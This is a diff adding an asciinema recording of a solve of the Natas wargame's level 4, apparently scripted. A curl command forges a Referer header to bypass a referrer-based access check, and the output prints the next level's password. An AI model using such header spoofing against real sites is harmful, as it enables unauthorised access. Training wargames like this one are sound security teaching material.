@@ -1,0 +1,6 @@
+{"version":3,"term":{"cols":100,"rows":32},"timestamp":1793469343,"idle_time_limit":2.0,"command":"python3 -I /home/claude/tools/ptyrun_sh.py /home/claude/solves/natas/L4.sh","title":"Natas L4 solve","env":{"SHELL":"/bin/bash"}}
+[0.009, "o", "$ curl -s -u natas4:<pw> http://natas4.natas.labs.overthewire.org/    # access disallowed\r\r\n"]
+[1.027, "o", "Access disallowed. You are visiting from \"\" while authorized users should come only from \"http://natas5.natas.labs.overthewire.org/\"\r\r\n"]
+[0.001, "o", "$ curl -s -u natas4:<pw> -H \"Referer: http://natas5.natas.labs.overthewire.org/\" http://natas4.natas.labs.overthewire.org/\r\r\n"]
+[0.937, "o", "Access granted. The password for natas5 is e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M\r\r\n"]
+[0.003, "x", "0"]
